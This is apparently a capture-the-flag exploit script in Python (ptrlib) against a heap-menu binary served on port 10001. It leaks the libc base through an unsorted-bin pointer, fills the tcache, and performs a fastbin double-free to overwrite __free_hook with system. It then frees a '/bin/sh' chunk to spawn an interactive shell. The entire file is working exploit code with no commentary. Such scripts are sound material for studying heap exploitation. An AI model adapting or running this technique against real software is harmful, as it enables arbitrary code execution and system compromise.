from ptrlib import *

def add_info(size, name, call):
    sock.recvuntil("your choice:")
    sock.sendline("1")
    sock.recvline()
    sock.sendline(str(size))
    sock.recvline()
    sock.send(name)
    sock.recvline()
    sock.send(call)

def show_info(index):
    sock.recvuntil("your choice:")
    sock.sendline("2")
    sock.recvuntil("index:\n")
    sock.sendline(str(index))
    sock.recvuntil("name:\n")
    name = sock.recvline().rstrip()
    sock.recvuntil("phone:\n")
    phone = sock.recvline().rstrip()
    return name, phone

def call_girl(index):
    sock.recvuntil("your choice:")
    sock.sendline("4")
    sock.recvuntil("index:\n")
    sock.sendline(str(index))

libc = ELF("./lib/libc.so.6")
sock = Socket("localhost", 10001)
#sock = Socket("34.92.96.238", 10001)
main_arena = 0x3b1c40
delta = 96

# leak libc base
add_info(0x1000, b"A", b"a") # 0
add_info(0x1000, b"A", b"a") # 1
call_girl(0)
call_girl(1)
name, call = show_info(0)
addr_unsorted_bin = u64(name)
libc_base = addr_unsorted_bin - main_arena - delta
dump("libc base = " + hex(libc_base))

# Fill TCache
dump("Filling TCache")
for i in range(9): # 2 - 10
    add_info(0x68, b"A", b"a")
for i in range(7):
    call_girl(2 + i)

# Fastbin corruption attack
dump("Fastbin Corruption Attack")
call_girl(9)
call_girl(10)
call_girl(9)
for i in range(7):
    add_info(0x68, b"A", b"a") # 11 - 17

payload = p64(libc_base + libc.symbol("__free_hook") - 3)
add_info(0x68, payload, b"a") # 18
add_info(0x68, "B", b"a") # 19
add_info(0x68, "A", b"a") # 20
payload = b'\x00' * 3
payload += p64(libc_base + libc.symbol("system"))
add_info(0x68, payload, b"a") # 21

# Get the shell!
add_info(0x18, "/bin/sh\x00", b"a") # 22
call_girl(22)

sock.interactive()
